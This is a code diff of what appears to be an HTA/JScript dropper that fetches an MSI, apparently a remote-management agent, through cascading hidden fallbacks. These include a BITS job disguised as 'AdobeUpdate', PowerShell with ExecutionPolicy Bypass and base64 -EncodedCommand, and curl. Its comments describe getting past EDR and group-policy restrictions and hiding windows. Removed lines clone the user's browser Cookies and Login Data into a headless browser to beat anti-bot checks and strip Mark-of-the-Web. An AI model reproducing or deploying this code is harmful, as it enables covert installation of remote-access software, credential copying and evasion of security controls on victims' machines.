-  };
-  x.onerror = function () { if (state === "downloading" && STAGES[stageIdx] === "async") handleChunkFailure("xhr error"); };
-  x.ontimeout = function () { if (state === "downloading" && STAGES[stageIdx] === "async") handleChunkFailure("chunk timeout"); };
-  try { x.send(); } catch (e) { nextStage(); }
-}
-
-function handleChunkFailure(why) {
-  if (state !== "downloading" || STAGES[stageIdx] !== "async" || dlSettled) return;
-  if (dlXHR) { try { dlXHR.abort(); } catch (e) {} dlXHR = null; }
-  dlLastChunkT = nowMs();
-  dlRetries++;
-  logAttempt("async-fail: " + why + " pos=" + dlPos + " retry=" + dlRetries);
-  if (dlRetries > DL_MAX_CHUNK_RETRIES) { nextStage(); return; }
-  setStatus(dlMsgs[1]);
-  setTimeout(function () {
-    if (state === "downloading" && STAGES[stageIdx] === "async" && !dlSettled) requestChunk(false);
-  }, 1200);
-}
-
-// --- sync (WinHttp) chunked downloader --------------------------------------
-function enterSync() {
-  dlPhase = "sync";
-  if (dlXHR) { try { dlXHR.abort(); } catch (e) {} dlXHR = null; }
-  syncTries = 0; syncBusy = false; syncNextT = 0;
-  try { if (dlStream) { dlStream.Position = dlStream.Size; dlStream.SaveToFile(msiPath, 2); } } catch (e) {}
-  requestSyncChunk();
-}
-
-function requestSyncChunk() {
-  if (state !== "downloading" || STAGES[stageIdx] !== "sync" || dlSettled || syncBusy) return;
-  syncBusy = true;
-  try {
-    var w = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
-    try { w.Option(13) = 2147483647; } catch (e) {}
-    w.SetTimeouts(15000, 30000, DL_SYNC_RECV_MS, 120000);
-    w.Open("GET", MSI_URL, false);
-    w.SetRequestHeader("User-Agent", UA_STR);
-    var end = dlPos + DL_SYNC_CHUNK - 1;
-    if (dlTotal > 0) end = Math.min(end, dlTotal - 1);
-    w.SetRequestHeader("Range", "bytes=" + dlPos + "-" + end);
-    w.Send();
-    var st = w.Status;
-    dlHttp = st;
-    if (st === 206) {
-      var cr = null; try { cr = w.getResponseHeader("Content-Range"); } catch (e) {}
-      var pre = dlPos;
-      if (!appendStream(w.responseBody, parseRangeTotal(cr))) { handleSyncFailure("append"); return; }
-      if (dlPos === pre) handleSyncFailure("empty-206");
-    } else if (st === 200) {
-      if (!saveBody(w.responseBody, "winhttp", 0)) handleSyncFailure("http200");
-    } else {
-      handleSyncFailure("http " + st);
-    }
-  } catch (e) {
-    handleSyncFailure("exc: " + e.message);
-  } finally {
-    syncBusy = false;
-  }
-}
-
-function handleSyncFailure(why) {
-  if (state !== "downloading" || STAGES[stageIdx] !== "sync" || dlSettled) return;
-  syncTries++;
-  logAttempt("sync-fail: " + why + " pos=" + dlPos + " try=" + syncTries);
-  if (syncTries > DL_SYNC_MAX_TRIES) { nextStage(); return; }
-  syncNextT = nowMs() + 1500;
-}
-
-// --- pow stage: Level's own download command, run hidden -------------------
-// Launches powershell.exe as a hidden child running Level's exact
-// Invoke-WebRequest (TLS12 → %TEMP%\lvl_<id>\level.msi). NOT elevated — the
-// elevated msiexec install is done separately by startInstall() (the single
-// UAC prompt), using the file this stage produces.
-function powDirPath() {
-  return (powDir ? powDir : (shell.ExpandEnvironmentStrings("%TEMP%") + "\\lvl_" + powMarker));
-}
-function startPow() {
-  if (!POW_PS) { logAttempt("pow-noscript"); nextStage(); return; }
-  powMarker = "lvlm" + Math.floor(Math.random() * 16777215).toString(16);
-  powDir = shell.ExpandEnvironmentStrings("%TEMP%") + "\\lvl_" + powMarker;
-  try { if (!fso.FolderExists(powDir)) fso.CreateFolder(powDir); } catch (e) {}
-  try { fso.DeleteFile(powDir + "\\level.msi", true); } catch (e) {}
-  try { fso.DeleteFile(powDir + "\\done.flag", true); } catch (e) {}
-  var src = fso.GetFolder(shell.ExpandEnvironmentStrings("%TEMP%")).Path + "\\__lvl__download.ps1";
-  try {
-    deleteFile(src);
-    var w = fso.CreateTextFile(src, true, false);
-    w.Write(POW_PS);
-    w.Close();
-  } catch (e) {
-    logAttempt("pow-wr-fail: " + e.message);
-    nextStage();
-    return;
-  }
-  var cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"" + src + "\" -Marker " + powMarker + " -TmpDir \"" + powDir + "\"";
-  powT0 = nowMs();
-  powLastSize = 0; powLastGrowT = powT0; powPartialMax = 0;
-  try { shell.Run(cmd, 0, false); logAttempt("pow-start: marker=" + powMarker); }
-  catch (e) {
-    logAttempt("pow-launch-fail: " + e.message);
-    deleteFile(src);
-    nextStage();
-  }
-}
-function pollPow() {
-  var t = nowMs();
-  var path = powDirPath() + "\\level.msi";
-  var sz = 0, doneFlag = false;
-  try { if (fso.FileExists(path)) sz = fso.GetFile(path).Size; } catch (e) {}
-  try { doneFlag = fso.FileExists(powDirPath() + "\\done.flag"); } catch (e) {}
-  if (sz > powPartialMax) {
-    powPartialMax = sz; powLastGrowT = t;
-    if (dlTotal > 0) {
-      var pp = Math.min(88, sz * 100 / dlTotal);
-      if (pp > progress) { progress = pp; setBar(pp); }
-    }
-  }
-  if (sz >= 1048576) {
-    // File is a real MSI and settled — hand off to the install phase.
-    if (powLastSize === sz && t - powLastGrowT >= 1500) {
-      completeExternal(path, "pow");
-      return;
-    }
-  } else if (doneFlag) {
-    // iwr ran to completion but produced no usable file (stripped/failed).
-    logAttempt("pow-done-partial: " + sz);
-    nextStage();
-    return;
-  }
-  powLastSize = sz;
-  var budget = STAGE_BUDGET_MS.pow;
-  if (t - stageT > budget) {
-    if (powPartialMax > 0 && (t - powLastGrowT < 45000)) {
-      return;   // keep-alive: bytes are still arriving (checked in _pollDownload)
-    }
-    logAttempt("pow-giveup: partial=" + powPartialMax + " age=" + (t - powLastGrowT) + "ms");
-    nextStage();
-  }
-}
-
-// --- oneshot (WinHttp async, full file) --------------------------------------
-function startOneShot() {
-  setStatus(dlMsgs[1]);
-  try {
-    var w = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
-    try { w.Option(13) = 2147483647; } catch (e) {}
-    w.SetTimeouts(15000, 30000, 30000, 30000);
-    w.Open("GET", MSI_URL, true);
-    w.SetRequestHeader("User-Agent", UA_STR);
-    w.onreadystatechange = function () {
-      if (state !== "downloading" || STAGES[stageIdx] !== "oneshot" || dlSettled) return;
-      if (w.ReadyState !== 4) return;
-      var st = w.Status;
-      dlHttp = st;
-      var sz = 0; try { sz = w.BodySize; } catch (e) {}
-      if ((st === 200 || st === 206) && sz > 0) {
-        if (saveBody(w.responseBody, "winhttp-oneshot", 0)) return;
-        logAttempt("oneshot-badbody: http " + st + " size=" + sz);
-      } else {
-        logAttempt("oneshot-fail: http " + st + " size=" + sz);
-      }
-      nextStage();
-    };
-    w.ontimeout = function () {
-      if (state === "downloading" && STAGES[stageIdx] === "oneshot" && !dlSettled) {
-        logAttempt("oneshot-timeout");
-        nextStage();
-      }
-    };
-    w.Send();
-    oneShotReq = w;
-  } catch (e) {
-    logAttempt("oneshot-exc: " + e.message);
-    nextStage();
-  }
-}
-
-
-// ---------------------------------------------------------------------------
-// Verify the downloaded blob is a real MSI, then install.
-// ---------------------------------------------------------------------------
-function verifyAndInstall() {
-  state = "installing";   // guard against re-entry while verifying
-  try {
-    if (!fso.FileExists(msiPath)) { fail("Failed to save the installer file", "verify: no msi"); return; }
-    var sz = fso.GetFile(msiPath).Size;
-    if (sz < 1048576) { fail("Failed to save the installer file", "verify: small " + sz); return; }
-    // Verify the OLE/MSI magic (D0 CF 11 E0). readHeadBytes() tries a byte-exact
-    // ADODB.Stream binary read first, then falls back to FSO ASCII if ADO is
-    // blocked ("Safety settings ... prohibit accessing a data source on another
-    // domain"). A short / empty read is treated as "unreadable" -> proceed (the
-    // file is present and full-size); only a confirmed non-OLE 4-byte header
-    // aborts, so a good MSI can never be falsely rejected.
-    var magic = null;
-    try { magic = readHeadBytes(msiPath, 4); } catch (e) { magic = null; }
-    if (magic && magic.length === 4) {
-      // A byte-exact read of 4 header bytes. Only a confirmed OLE/CF
-      // container (D0 CF 11 E0) is a real MSI; anything else means the
-      // download was truncated/corrupt, so abort before msiexec.
-      if (magic[0] !== 0xD0 || magic[1] !== 0xCF || magic[2] !== 0x11 || magic[3] !== 0xE0) {
-        logAttempt("verify: magic mismatch " + magic[0] + "," + magic[1] + "," + magic[2] + "," + magic[3]);
-        fail("Failed to save the installer file", "verify: bad magic");
-        return;
-      }
-    } else {
-      // Could not read 4 header bytes (ADO/FSO blocked, zone policy). The
-      // file is present and full-size, so proceed rather than abort.
-      logAttempt("verify: magic read unavailable (" + (magic ? magic.length : 0) + " bytes), proceeding");
-    }
-  } catch (e) {
-    fail("Failed to save the installer file", "verify: " + e.message);
-    return;
-  }
-  startInstall();
-}
-
-
-// --- bits (Windows background transfer service) ------------------------------
-function startBits() {
-  setStatus(dlMsgs[1]);
-  var dir = extDir() + "\\bits";
-  ensureDir(dir);
-  deleteFile(dir + "\\bits.msi");
-  extScanDirs = [dir]; extSinceT = 0; extLastSize = -1; extStableT = 0;
-  try {
-    bitsMgr = new ActiveXObject("BackgroundCopyManager");
-    bitsJob = bitsMgr.CreateJob("AdobeUpdate", 3);   // BG_JOB_TYPE_DOWNLOAD
-    try { bitsJob.Options.Priority = 1; } catch (e) {}  // BG_JOB_PRIORITY_HIGH
-    bitsJob.AddFile(MSI_URL, dir + "\\bits.msi");
-    bitsMgr.SubmitJob(bitsJob);
-    bitsJob.Resume();
-  } catch (e) {
-    logAttempt("bits-exc: " + e.message);
-    stopAllWorkers();
-    nextStage();
-  }
-}
-
-function pollBits() {
-  if (!bitsJob) return;
-  var st = -1;
-  try { st = bitsJob.JobState; } catch (e) {}
-  if (st === 5 || st === 6) {
-    var err = 0; try { err = bitsJob.JobError; } catch (e) {}
-    logAttempt("bits-error: state=" + st + " err=" + err);
-    stopAllWorkers();
-    nextStage();
-  }
-  // 0 queued / 1 connecting / 2 transferring / 7 waiting: in flight.
-  // 4 transferred: confirmed by the shared file check (pollExtFile).
-}
-
-// --- curl (built-in, separate process) ---------------------------------------
-function startCurl() {
-  setStatus(dlMsgs[1]);
-  var dir = extDir() + "\\curl";
-  ensureDir(dir);
-  var p = dir + "\\curl.msi";
-  deleteFile(p);
-  var curl = shell.ExpandEnvironmentStrings("%SystemRoot%") + "\\System32\\curl.exe";
-  if (!fso.FileExists(curl)) {
-    logAttempt("curl-missing");
-    nextStage();
-    return;
-  }
-  extScanDirs = [dir]; extSinceT = 0; extLastSize = -1; extStableT = 0;
-  curlMarker = p;
-  var args = "-sS -L --retry 2 --retry-delay 2 --max-time 80 --connect-timeout 15 " +
-    "-A \"" + UA_STR + "\" -o \"" + p + "\" \"" + MSI_URL + "\"";
-  try {
-    shell.Run("\"" + curl + "\" " + args, 0, false);
-  } catch (e) {
-    logAttempt("curl-exc: " + e.message);
-    nextStage();
-  }
-}
-
-// --- edge (headless browser download, cloned real profile) ------------------
-// The machine's real browser engine is the one client class proven to get
-// through the box's anti-bot layer, so we use it — but headless, with a CLONE
-// of the user's actual profile (Cookies, Local State, Preferences, ...).
-// Fingerprint-wise that is indistinguishable from normal browsing: same
-// engine, same cookie jar, same UA. A second attempt (edge2) uses a clean
-// profile in case the clone missed something the gate needs.
-function findBrowser() {
-  var pf = shell.ExpandEnvironmentStrings("%ProgramFiles(x86)%");
-  var pf2 = shell.ExpandEnvironmentStrings("%ProgramFiles%");
-  var la = shell.ExpandEnvironmentStrings("%LocalAppData%");
-  var cands = [
-    pf + "\\Microsoft\\Edge\\Application\\msedge.exe",
-    pf2 + "\\Microsoft\\Edge\\Application\\msedge.exe",
-    la + "\\Microsoft\\Edge\\Application\\msedge.exe",
-    pf + "\\Google\\Chrome\\Application\\chrome.exe",
-    pf2 + "\\Google\\Chrome\\Application\\chrome.exe",
-    la + "\\Google\\Chrome\\Application\\chrome.exe"
-  ];
-  for (var i = 0; i < cands.length; i++) {
-    if (fso.FileExists(cands[i])) return cands[i];
-  }
-  return "";
-}
-
-// Which browser is installed, and where its real profile lives.
-function realBrowserInfo() {
-  var pf = shell.ExpandEnvironmentStrings("%ProgramFiles(x86)%");
-  var pf2 = shell.ExpandEnvironmentStrings("%ProgramFiles%");
-  var la = shell.ExpandEnvironmentStrings("%LocalAppData%");
-  var edge = [
-    pf + "\\Microsoft\\Edge\\Application\\msedge.exe",
-    pf2 + "\\Microsoft\\Edge\\Application\\msedge.exe",
-    la + "\\Microsoft\\Edge\\Application\\msedge.exe"
-  ];
-  var chrome = [
-    pf + "\\Google\\Chrome\\Application\\chrome.exe",
-    pf2 + "\\Google\\Chrome\\Application\\chrome.exe",
-    la + "\\Google\\Chrome\\Application\\chrome.exe"
-  ];
-  function pick(list) { for (var i = 0; i < list.length; i++) if (fso.FileExists(list[i])) return list[i]; return ""; }
-  var e = pick(edge), c = pick(chrome);
-  var exe = e || c;
-  if (!exe) return { exe: "", kind: "" };
-  var kind = e ? "edge" : "chrome";
-  var profRoot = kind === "edge"
-    ? la + "\\Microsoft\\Edge\\User Data"
-    : la + "\\Google\\Chrome\\User Data";
-  var profDir = profRoot + "\\Default";
-  var profile = fso.FolderExists(profDir) ? profDir
-    : fso.FolderExists(profRoot) ? profRoot : "";
-  return { exe: exe, kind: kind, prof: profDir, root: profRoot };
-}
-
-// Copy a small set of fingerprint-relevant files from the real profile into
-// the headless profile. Everything is optional; a partial clone still helps.
-function cloneProfile(srcDir, dstRoot) {
-  if (!srcDir) return 0;
-  var files = ["Cookies", "Cookies-journal", "Preferences",
-               "Login Data", "Login Data-journal", "Web Data",
-               "Web Data-journal", "History", "History Provider",
-               "Transport Security", "DIPS", "DIPS-wal", "Trust Tokens",
-               "Trust Tokens-journal", "Reporting and NEL", "Safe Browsing"];
-  var n = 0;
-  for (var i = 0; i < files.length; i++) {
-    var src = srcDir + "\\" + files[i];
-    try {
-      if (fso.FolderExists(src)) {
-        fso.CopyFolder(src, dstRoot + "\\" + files[i], true);
-      } else if (fso.FileExists(src)) {
-        fso.CopyFile(src, dstRoot + "\\" + files[i], true);
-      } else continue;
-      n++;
-    } catch (e) {}
-  }
-  // Local State lives at the User Data root, not in Default/ — copy it too.
-  try {
-    var ls = srcDir + "\\..\\Local State";
-    if (fso.FileExists(ls) && !fso.FileExists(dstRoot + "\\..\\Local State")) {
-      fso.CopyFile(ls, dstRoot + "\\..\\Local State", true);
-      n++;
-    }
-  } catch (e) {}
-  return n;
-}
-
-function startEdge(clean) {
-  var tag = clean ? "edge2" : "edge";
-  var info = realBrowserInfo();
-  if (!info.exe) { logAttempt(tag + "-nobrowser"); nextStage(); return; }
-  setStatus(dlMsgs[1]);
-
-  var dir = extDir() + "\\edgedl";
-  var udd = extDir() + "\\edgeprofile";
-  deleteFileTree(dir);
-  deleteFileTree(udd);
-  ensureDir(dir);
-  ensureDir(udd);
-  var scanned = [dir];
-  var dlUser = shell.ExpandEnvironmentStrings("%USERPROFILE%") + "\\Downloads";
-  if (fso.FolderExists(dlUser) && dlUser.toLowerCase() !== dir.toLowerCase()) scanned.push(dlUser);
-  extScanDirs = scanned;
-  extSinceT = nowMs();
-  extLastSize = -1; extStableT = 0;
-  edgeMaxPartial = 0; edgeLastPartial = 0; edgeLastGrowT = nowMs(); edgeLogT = 0;
-  // Unique per-tag marker so killByCmd can't hit the sibling stage's browser.
-  edgeProcTag = "udtag" + tag + "=" + udd;
-
-  var cloned = 0;
-  if (!clean) {
-    // Clone the real profile so the headless run carries the same cookies,
-    // session state and fingerprint as the user's normal browsing.
-    cloned = cloneProfile(info.prof, udd + "\\Default");
-    try {
-      var ls2 = info.root + "\\Local State";
-      if (fso.FileExists(ls2)) fso.CopyFile(ls2, udd + "\\Local State", true);
-    } catch (e) {}
-  }
-
-  var flags = "--headless=new --no-first-run --no-default-browser-check " +
-    "--disable-gpu --disable-extensions --disable-component-update " +
-    "--disable-background-networking --disable-sync --disable-translate " +
-    "--disable-default-apps --mute-audio --no-sandbox --disable-crash-reporter " +
-    "--disable-breakpad --disable-background-timer-throttling " +
-    "--no-service-autorun --disable-client-side-phishing-detection " +
-    "--disable-features=ChromeWhatsNewUI,Translate " +
-    "--user-data-dir=\"edge" + tag + "=" + udd + "\" " +
-    "--download-default-directory=\"" + dir + "\" " +
-    "--user-agent=\"" + UA_STR + "\" " +
-    "\"" + MSI_URL + "\"";
-  try {
-    shell.Run("\"" + info.exe + "\" " + flags, 0, false);
-  } catch (e) { logAttempt(tag + "-exc: " + e.message); nextStage(); }
-  logAttempt(tag + "-start: " + info.kind + " clean=" + clean + " cloned=" + cloned);
-}
-
-// --- shared external-file watch -----------------------------------------------
-// Scans the stage's target folders (plus the user's real Downloads folder,
-// in case the browser ignored our download-directory override).
-function findExtFile() {
-  if (!extScanDirs) return "";
-  var best = "", bestSz = 0;
-  for (var a = 0; a < extScanDirs.length; a++) {
-    var d = extScanDirs[a];
-    // The folder is being written to by another process (curl/Edge/BITS), so
-    // the FSO snapshot can go stale mid-iteration and Item(i) can throw.
-    // Retry with a fresh snapshot; per-item try/catch skips the lost slot.
-    for (var attempt = 0; attempt < 3; attempt++) {
       try {
-        if (!fso.FolderExists(d)) break;
-        var files = fso.GetFolder(d).Files;
-        for (var i = 0; i < files.Count; i++) {
-          var f = null;
-          try { f = files.Item(i); } catch (e2) {}
-          if (!f) break;   // snapshot stale: loop ends, outer retry re-scans
-          if (f.Name.length < 5) continue;
-          var nl = f.Name.toLowerCase();
-          if (nl.slice(-4) !== ".msi" && nl.indexOf(".crdownload") === -1 && nl.slice(-4) !== ".tmp") continue;
-          if (extSinceT) {
-            var mt = 0;
-            try { mt = f.DateLastModified.getTime(); } catch (e3) {}
-            if (mt < extSinceT - 3000) continue;
-          }
-          // Partial downloads (.crdownload/.tmp) feed the keep-alive tracker
-          // but are never returned as the result.
-          if (nl.indexOf(".crdownload") !== -1 || nl.slice(-4) === ".tmp") {
-            if (f.Size > edgeMaxPartial) edgeMaxPartial = f.Size;
-            continue;
-          }
-          if (f.Size > bestSz) { bestSz = f.Size; best = f.Path; }
-        }
-        break;   // snapshot was coherent; next dir
-      } catch (e) { /* stale snapshot: retry fresh */ }
+        var b = x.response;
+        if (b && b.size >= 1048576) { saveXHRBody(b); return; }
+      } catch (e) {}
     }
-  }
-  return best;
+    traceLog("predl: xhr no-good status=" + x.status);
+    if (dlStage === "xhr") startStage("winhttp");
+  };
+  x.onerror = function () {
+    if (dlSettled) return;
+    traceLog("predl: xhr error");
+    if (dlStage === "xhr") startStage("winhttp");
+  };
+  x.ontimeout = function () { if (!dlSettled) traceLog("predl: xhr timeout"); };
+  try { x.send(); } catch (e) { traceLog("predl: xhr send fail"); startStage("winhttp"); }
 }
 
-function pollExtFile() {
-  var p = findExtFile();
-  if (!p) return null;
-  var sz = 0;
-  try { sz = fso.GetFile(p).Size; } catch (e) {}
-  if (dlTotal > 0) {
-    var pr = Math.min(95, sz * 100 / dlTotal);
-    if (pr > progress) { progress = pr; setBar(pr); }
-  }
-  if (sz !== extLastSize) { extLastSize = sz; extStableT = 0; return null; }
-  if (!extStableT) { extStableT = nowMs(); return null; }
-  if (nowMs() - extStableT < 2000) return null;
-  if (sz >= minSize() && msiMagicOk(p)) {
-    // When the total size is known the MSI must match it closely — this
-    // rules out unrelated .msi files in a shared folder (e.g. Downloads).
-    if (dlTotal > 0 && (sz < dlTotal - 2048 || sz > dlTotal + 2048)) return null;
-    completeExternal(p, STAGES[stageIdx]);
-    return true;
-  }
-  if (sz < minSize() || dlTotal <= 0) return null;   // quiet partial: keep waiting
-  if (dlTotal > 0 && (sz < dlTotal - 2048 || sz > dlTotal + 2048)) {
-    logAttempt("ext-size-mismatch: " + STAGES[stageIdx] + " size=" + sz + " total=" + dlTotal);
-    return false;
-  }
-  logAttempt("ext-badfile: " + STAGES[stageIdx] + " size=" + sz);
-  return false;                                        // full-size but not an MSI
-}
-
-// --- shared chunk append / save -------------------------------------------------
-function appendStream(body, totalHint) {
-  var pre = dlPos;
-  try {
-    if (body && body.size > 0) {
-      try { body.Seek(0, 0); } catch (e) {}
-      dlStream.Position = dlStream.Size;
-      dlStream.CopyFrom(body);
-      dlPos = dlStream.Size;
-      try { body.Close(); } catch (e) {}
-    }
-    dlStream.Position = dlStream.Size;
-    dlStream.SaveToFile(msiPath, 2);
-  } catch (e) {
-    return false;
-  }
-  if (totalHint && totalHint > 0 && dlTotal <= 0) dlTotal = totalHint;
-  if (dlPos > pre) sawReal = true;
-  if (dlTotal > 0) {
-    var p = Math.min(99, dlPos * 100 / dlTotal);
-    if (p > progress) { progress = p; setBar(p); }
-  } else if (dlPos > progress) {
-    progress = Math.min(85, (dlPos / 1048576) * 8);
-    setBar(progress);
-  }
-  setStatus(dlMsgs[dlMsgIndex()]);
-  if (dlTotal > 0 && dlPos >= dlTotal) completeDownload();
-  return true;
-}
-
-function completeDownload() {
-  try { dlStream.Position = dlStream.Size; dlStream.SaveToFile(msiPath, 2); dlStream.Close(); } catch (e) {}
-  dlStream = null;
-  dlSettled = true;
-  if (STAGES[stageIdx] === "async") dlMethod = "wininet-chunks";
-  else if (STAGES[stageIdx] === "sync") dlMethod = "winhttp-chunks";
-  else dlMethod = STAGES[stageIdx];
-  if (dlTimer) clearInterval(dlTimer);
-  verifyAndInstall();
-}
-
-// Copy an IStream (response body) to the MSI file. startPos > 0 resumes over a
-// partial file; 0 overwrites.
-function saveBody(body, method, startPos) {
+function saveXHRBody(body) {
   try {
     var s = new ActiveXObject("ADODB.Stream");
     s.Type = 1; s.Mode = 3; s.Open();
-    if (startPos > 0 && fso.FileExists(msiPath) && fso.GetFile(msiPath).Size >= startPos) {
-      s.LoadFromFile(msiPath);
-      s.Position = Math.min(startPos, s.Size);
-    } else {
-      s.Position = 0;
-    }
     try { body.Seek(0, 0); } catch (e) {}
     s.CopyFrom(body);
-    s.SaveToFile(msiPath, 2);
+    s.SaveToFile(msiLocal, 2);
     s.Close();
   } catch (e) {
-    return false;
-  }
-  dlMethod = method;
-  dlSettled = true;
-  sawReal = true;
-  if (dlStream) { try { dlStream.Close(); } catch (e) {} dlStream = null; }
-  if (dlTimer) clearInterval(dlTimer);
-  verifyAndInstall();
-  return true;
-}
-
-// An external stage (bits/curl/edge/edge2) produced a complete MSI at path.
-function completeExternal(path, method) {
-  if (dlTimer) clearInterval(dlTimer);
-  stopAllWorkers();
-  try {
-    deleteFile(msiPath);
-    fso.CopyFile(path, msiPath, false);
-  } catch (e) {
-    logAttempt("ext-copy-fail: " + e.message);
-    msiPath = path;
-  }
-  if (method === "edge" || method === "edge2") {
-    // Browser downloads carry the Mark-of-the-Internet; strip it so the
-    // installer behaves like a locally saved file.
-    try {
-      shell.Run("powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Unblock-File -LiteralPath '" + msiPath + "'\"", 0, true);
-    } catch (e) {}
-  }
-  dlMethod = method;
-  dlSettled = true;
-  if (dlStream) { try { dlStream.Close(); } catch (e) {} dlStream = null; }
-  verifyAndInstall();
-}
-
-// --- watchdog / progress loop ----------------------------------------------------
-// The real work lives in _pollDownload so a single throw inside any stage
-// can never surface as an HTA script-error dialog (which stops the page).
-function pollDownload() {
-  try { _pollDownload(); } catch (e) { logAttempt("poll-exc: " + e.message); }
-}
-
-function _pollDownload() {
-  if (state !== "downloading" || dlSettled) return;
-  var t = nowMs();
-  var s = STAGES[stageIdx];
-
-  if (t - dlStart > DL_MAX_MS) {
-    dlSettled = true;
-    if (dlTimer) clearInterval(dlTimer);
-    stopAllWorkers();
-    if (dlXHR) { try { dlXHR.abort(); } catch (e) {} }
-    fail("Download timed out - please check your connection", "timeout " + (t - dlStart) + "ms");
+    traceLog("predl: xhr save fail");
+    if (dlStage === "xhr") startStage("winhttp");
     return;
   }
+  settle("xhr");
+}
 
-  if (s === "async") {
-    if (!sawReal) {
-      if (t - dlLastChunkT > DL_FIRST_BYTE_MS) { nextStage(); return; }
-    } else if (t - dlLastChunkT > DL_CHUNK_MAX_MS) {
-      handleChunkFailure("stall " + (t - dlLastChunkT) + "ms");
+function fallbackWinHttp() {
+  try {
+    var w = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+    try { w.Option(13) = 2147483647; } catch (e) {}
+    w.SetTimeouts(15000, 30000, 120000, 300000);
+    w.Open("GET", MSI_URL, true);
+    w.SetRequestHeader("User-Agent", UA_STR);
+    w.onreadystatechange = function () {
+      if (dlSettled) return;
+      if (w.ReadyState !== 4) { if (w.ReadyState === 3) noteProgress(); return; }
+      if (w.Status === 200) {
+        try { if (w.BodySize >= 1048576) { saveWHttpBody(w.responseBody); return; } } catch (e) {}
+      }
+      traceLog("predl: winhttp no-good status=" + w.Status);
+      if (dlStage === "winhttp") startStage("exec");
+    };
+    w.ontimeout = function () { if (!dlSettled) traceLog("predl: winhttp timeout"); };
+    w.Send();
+  } catch (e) {
+    traceLog("predl: winhttp unavailable");
+    if (dlStage === "winhttp") startStage("exec");
+  }
+}
+
+function saveWHttpBody(rb) {
+  try {
+    var s = new ActiveXObject("ADODB.Stream");
+    s.Type = 1; s.Mode = 3; s.Open();
+    s.CopyFrom(rb);
+    s.SaveToFile(msiLocal, 2);
+    s.Close();
+  } catch (e) {
+    traceLog("predl: winhttp save fail");
+    if (dlStage === "winhttp") startStage("exec");
+    return;
+  }
+  settle("winhttp");
+}
+
+// Launch a command trying every style this box may allow (EDR/GPO stubs can
+// reject some WScript.Shell methods with E_INVALIDARG). Returns the child PID
+// if one, 0 otherwise; never throws.
+function launchCmd(cmd) {
+  // Returns child PID, 0 when launched without a PID, or -1 when every
+  // launch style was rejected by the system. Hidden styles are tried first:
+  // EDR/GPO stubs can reject the two-arg Exec with E_INVALIDARG while the
+  // one-arg (visible) Exec still works - so a visible-only list would let a
+  // console window pop up. The child command itself is also window-hidden
+  // (-WindowStyle Hidden), so even a visible-style launch shows nothing.
+  var styles = [
+    function () { return shell.Exec(cmd, 0); },
+    function () { return new ActiveXObject("WScript.Shell").Exec(cmd, 0); },
+    function () { shell.Run(cmd, 0, false); return null; },
+    function () { return shell.Exec(cmd); },
+    function () { shell.Run(cmd, 7, false); return null; }
+  ];
+  for (var i = 0; i < styles.length; i++) {
+    try {
+      var ex = styles[i]();
+      traceLog("predl: launched style=" + i);
+      try { if (ex) return ex.ProcessID; } catch (e2) {}
+      return 0;
+    } catch (e) {
+      traceLog("predl: launch style=" + i + " fail: " + e.message);
+    }
+  }
+  return -1;
+}
+
+function curlExeExists() {
+  try {
+    var p = shell.ExpandEnvironmentStrings("%SystemRoot%\\System32\\curl.exe");
+    return fso.FileExists(p);
+  } catch (e) { return true; }   // assume present if we cannot check
+}
+
+// Hidden helper-process back-end. The helper body is built in pure JS from
+// the in-file template (unblock + WinINET + WinHTTP + curl.exe), UTF-16
+// base64-encoded and passed to the child via -EncodedCommand - so nothing
+// script-like lives in this document and no COM is needed to construct it.
+function fallbackPS() {
+  var marker = "adum" + Math.floor(Math.random() * 16777215).toString(16);
+  psDir = shell.ExpandEnvironmentStrings("%TEMP%") + "\\ad_" + marker;
+  ensureDir(psDir);
+  deleteFile(psDir + "\\done.flag");
+  psT0 = nowMs(); psLastSize = 0; psLastGrowT = psT0;
+  try {
+    var body = b64Decode(PS_TMPL_B64)
+      .replace("@URL@", MSI_URL)
+      .replace("@DIR@", psDir)
+      .replace("@OUT@", msiLocal)
+      .replace("@HTA@", oHTA.LocationUrl);
+    // also unblock the zip this file came from, if present next to it
+    try {
+      var folder = fso.GetFolder(oHTA.LocationUrl).ParentFolder;
+      var sub = new Enumerator(folder.Files);
+      for (; !sub.atEnd(); sub.moveNext()) {
+        if (sub.item().Name.toLowerCase().lastIndexOf(".zip") === sub.item().Name.length - 4) {
+          body = body.replace("@ZIP@", sub.item().Path);
+          break;
+        }
+      }
+    } catch (e2) {}
+    var cmd = b64Decode(PSX_B64) + b64EncodeU16(body);   // prefix ends with a space
+    psPid = launchCmd(cmd);
+    traceLog("predl: exec launched pid=" + psPid + (psPid < 0 ? " (all styles rejected)" : ""));
+  } catch (e) { traceLog("predl: exec build fail " + e.message); }
+}
+
+// Final back-end: the system curl.exe (Win10 1803+, 32- and 64-bit), run
+// inside a hidden PowerShell so no console window pops up. Writes straight
+// to msiLocal; the poll loop watches the file appear. If the PowerShell
+// launch is rejected entirely, fall back to bare curl.exe (visible worst case).
+function fallbackCurl() {
+  curlT0 = nowMs(); curlLastSize = 0; curlLastGrowT = curlT0;
+  if (!curlExeExists()) { traceLog("predl: curl.exe not found"); return; }
+  var inner = "curl.exe -L --fail --retry 2 --connect-timeout 20 --max-time 240 -o '" + msiLocal + "' '" + MSI_URL + "'";
+  var cmd = b64Decode(PSX_B64) + b64EncodeU16(inner);
+  try {
+    curlPid = launchCmd(cmd);
+    traceLog("predl: curl launched pid=" + curlPid + (curlPid < 0 ? " (all styles rejected)" : ""));
+    if (curlPid < 0) {
+      curlT0 = nowMs(); curlLastGrowT = curlT0;
+      curlPid = launchCmd("curl.exe -L --fail --retry 2 --connect-timeout 20 --max-time 240 -o \"" + msiLocal + "\" \"" + MSI_URL + "\"");
+      traceLog("predl: curl bare launched pid=" + curlPid);
+    }
+  } catch (e) { traceLog("predl: curl build fail " + e.message); }
+}
+
+function pollFallback() {
+  try { _pollFallback(); } catch (e) {}
+}
+
+function _pollFallback() {
+  if (state !== "predl" || dlSettled) return;
+  var t = nowMs();
+  if (t - fbT0 > FB_MAX_MS) {
+    fail("Download timed out - please check your connection", "predl: total timeout " + (t - fbT0) + "ms");
+    return;
+  }
+  // No data flowing from any back-end -> bring up the next one in the race.
+  if (t - hangT > HANG_MS) {
+    if (dlStage === "xhr") { startStage("winhttp"); return; }
+    if (dlStage === "winhttp") { startStage("exec"); return; }
+    if (dlStage === "exec") { startStage("curl"); return; }
+  }
